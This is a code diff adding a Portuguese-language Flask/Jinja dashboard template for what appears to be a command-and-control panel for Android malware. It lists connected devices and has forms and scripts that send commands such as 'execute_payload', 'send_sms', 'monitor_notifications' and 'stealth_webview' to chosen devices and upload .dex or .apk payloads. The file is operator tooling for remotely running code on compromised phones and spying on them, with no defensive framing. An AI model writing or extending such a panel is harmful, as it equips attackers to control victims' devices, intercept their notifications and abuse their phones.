@@ -1,0 +1,351 @@
+{% extends "base.html" %}
+
+{% block title %}Dashboard - Sistema de Gerenciamento{% endblock %}
+
+{% block content %}
+<div class="d-flex justify-content-between align-items-center mb-4">
+    <h2><i class="fas fa-tachometer-alt"></i> Dashboard</h2>
+    <span class="badge bg-primary">Tempo Real</span>
+</div>
+
+<!-- Estatísticas -->
+<div class="row mb-4">
+    <div class="col-md-3">
+        <div class="card stat-card">
+            <div class="stat-number">{{ stats.total_devices }}</div>
+            <div class="stat-label">Dispositivos Totais</div>
+            <i class="fas fa-mobile-alt fa-2x text-primary mt-2"></i>
+        </div>
+    </div>
+    <div class="col-md-3">
+        <div class="card stat-card">
+            <div class="stat-number device-online">{{ stats.online_devices }}</div>
+            <div class="stat-label">Dispositivos Online</div>
+            <i class="fas fa-wifi fa-2x text-success mt-2"></i>
+        </div>
+    </div>
+    <div class="col-md-3">
+        <div class="card stat-card">
+            <div class="stat-number device-offline">{{ stats.offline_devices }}</div>
+            <div class="stat-label">Dispositivos Offline</div>
+            <i class="fas fa-power-off fa-2x text-danger mt-2"></i>
+        </div>
+    </div>
+    <div class="col-md-3">
+        <div class="card stat-card">
+            <div class="stat-number">{{ stats.recent_devices|length }}</div>
+            <div class="stat-label">Ativos Recentemente</div>
+            <i class="fas fa-clock fa-2x text-warning mt-2"></i>
+        </div>
+    </div>
+</div>
+
+<div class="row">
+    <!-- Dispositivos Recentes -->
+    <div class="col-md-6">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-list"></i> Dispositivos Recentes
+                </h5>
+            </div>
+            <div class="card-body p-0">
+                <div class="table-responsive">
+                    <table class="table table-hover mb-0">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Modelo</th>
+                                <th>Android</th>
+                                <th>Status</th>
+                                <th>Última Atividade</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for device in stats.recent_devices %}
+                            <tr>
+                                <td>
+                                    <small class="text-muted">{{ device[0][:8] }}...</small>
+                                    <button class="btn btn-sm btn-outline-secondary ms-1" 
+                                            onclick="copyToClipboard('{{ device[0] }}')"
+                                            title="Copiar ID">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </td>
+                                <td>{{ device[1] }}</td>
+                                <td>{{ device[2] }}</td>
+                                <td>
+                                    {% if device[3] and (now - device[3]).total_seconds() < 300 %}
+                                        <span class="badge bg-success">Online</span>
+                                    {% else %}
+                                        <span class="badge bg-secondary">Offline</span>
+                                    {% endif %}
+                                </td>
+                                <td>
+                                    <small>
+                                        {% if device[3] %}
+                                            {{ device[3].strftime('%d/%m %H:%M') }}
+                                        {% else %}
+                                            Nunca
+                                        {% endif %}
+                                    </small>
+                                </td>
+                            </tr>
+                            {% else %}
+                            <tr>
+                                <td colspan="5" class="text-center text-muted py-3">
+                                    Nenhum dispositivo conectado
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Ações Rápidas -->
+    <div class="col-md-6">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-bolt"></i> Ações Rápidas
+                </h5>
+            </div>
+            <div class="card-body">
+                <div class="row g-3">
+                    <div class="col-md-6">
+                        <div class="card bg-primary text-white">
+                            <div class="card-body text-center">
+                                <i class="fas fa-terminal fa-2x mb-2"></i>
+                                <h6>Enviar Comando</h6>
+                                <button class="btn btn-light btn-sm" data-bs-toggle="modal" data-bs-target="#commandModal">
+                                    Executar
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="card bg-success text-white">
+                            <div class="card-body text-center">
+                                <i class="fas fa-upload fa-2x mb-2"></i>
+                                <h6>Upload Payload</h6>
+                                <button class="btn btn-light btn-sm" data-bs-toggle="modal" data-bs-target="#uploadModal">
+                                    Carregar
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="card bg-warning text-white">
+                            <div class="card-body text-center">
+                                <i class="fas fa-sync-alt fa-2x mb-2"></i>
+                                <h6>Atualizar Status</h6>
+                                <button class="btn btn-light btn-sm" onclick="refreshDashboard()">
+                                    Atualizar
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="card bg-info text-white">
+                            <div class="card-body text-center">
+                                <i class="fas fa-chart-bar fa-2x mb-2"></i>
+                                <h6>Relatórios</h6>
+                                <a href="{{ url_for('logs') }}" class="btn btn-light btn-sm">
+                                    Ver Logs
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Status do Sistema -->
+        <div class="card mt-4">
+            <div class="card-header">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-server"></i> Status do Sistema
+                </h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-6">
+                        <small class="text-muted">Servidor</small>
+                        <div class="d-flex align-items-center">
+                            <div class="bg-success rounded-circle me-2" style="width: 10px; height: 10px;"></div>
+                            <span>Online</span>
+                        </div>
+                    </div>
+                    <div class="col-6">
+                        <small class="text-muted">Banco de Dados</small>
+                        <div class="d-flex align-items-center">
+                            <div class="bg-success rounded-circle me-2" style="width: 10px; height: 10px;"></div>
+                            <span>Conectado</span>
+                        </div>
+                    </div>
+                    <div class="col-6 mt-2">
+                        <small class="text-muted">WebSocket</small>
+                        <div class="d-flex align-items-center">
+                            <div class="bg-success rounded-circle me-2" style="width: 10px; height: 10px;"></div>
+                            <span>Ativo</span>
+                        </div>
+                    </div>
+                    <div class="col-6 mt-2">
+                        <small class="text-muted">Última Atividade</small>
+                        <div>{{ now.strftime('%d/%m/%Y %H:%M:%S') }}</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal de Comando -->
+<div class="modal fade" id="commandModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Enviar Comando</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="commandForm">
+                    <div class="mb-3">
+                        <label class="form-label">Dispositivo</label>
+                        <select class="form-select" name="device_id" required>
+                            <option value="">Selecione um dispositivo</option>
+                            {% for device in stats.recent_devices %}
+                                <option value="{{ device[0] }}">{{ device[1] }} ({{ device[0][:8] }}...)</option>
+                            {% endfor %}
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Tipo de Comando</label>
+                        <select class="form-select" name="command_type" required>
+                            <option value="">Selecione o tipo</option>
+                            <option value="execute_payload">Executar Payload</option>
+                            <option value="get_info">Obter Informações</option>
+                            <option value="send_sms">Enviar SMS</option>
+                            <option value="monitor_notifications">Monitorar Notificações</option>
+                            <option value="stealth_webview">WebView Furtiva</option>
+                            <option value="update_config">Atualizar Configuração</option>
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Dados do Comando (JSON)</label>
+                        <textarea class="form-control" name="command_data" rows="3" 
+                                  placeholder='{"key": "value"}'></textarea>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancelar</button>
+                <button type="button" class="btn btn-primary" onclick="sendCommand()">Enviar Comando</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal de Upload -->
+<div class="modal fade" id="uploadModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Upload de Payload</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="uploadForm" enctype="multipart/form-data">
+                    <div class="mb-3">
+                        <label class="form-label">Arquivo</label>
+                        <input type="file" class="form-control" name="file" accept=".dex,.apk,.png,.jpg" required>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Descrição</label>
+                        <textarea class="form-control" name="description" rows="2" 
+                                  placeholder="Descreva o payload..."></textarea>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancelar</button>
+                <button type="button" class="btn btn-success" onclick="uploadPayload()">Upload</button>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    // Variável global para timestamp atual
+    const now = new Date('{{ now.isoformat() }}');
+    
+    function refreshDashboard() {
+        location.reload();
+    }
+    
+    function sendCommand() {
+        const form = document.getElementById('commandForm');
+        const formData = new FormData(form);
+        
+        fetch('/api/command', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                device_id: formData.get('device_id'),
+                command_type: formData.get('command_type'),
+                data: formData.get('command_data') ? JSON.parse(formData.get('command_data')) : {}
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.command_id) {
+                showNotification('Comando enviado com sucesso!', 'success');
+                $('#commandModal').modal('hide');
+                form.reset();
+            } else {
+                showNotification('Erro ao enviar comando', 'danger');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            showNotification('Erro de conexão', 'danger');
+        });
+    }
+    
+    function uploadPayload() {
+        const form = document.getElementById('uploadForm');
+        const formData = new FormData(form);
+        
+        fetch('/api/upload_payload', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.status === 'success') {
+                showNotification('Payload enviado com sucesso! Hash: ' + data.hash, 'success');
+                $('#uploadModal').modal('hide');
+                form.reset();
+            } else {
+                showNotification('Erro no upload: ' + data.error, 'danger');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            showNotification('Erro de conexão', 'danger');
+        });
+    }
+    
+    // Atualizar timestamp a cada minuto
+    setInterval(() => {
+        now.setSeconds(now.getSeconds() + 60);
+    }, 60000);
+</script>
+{% endblock %}
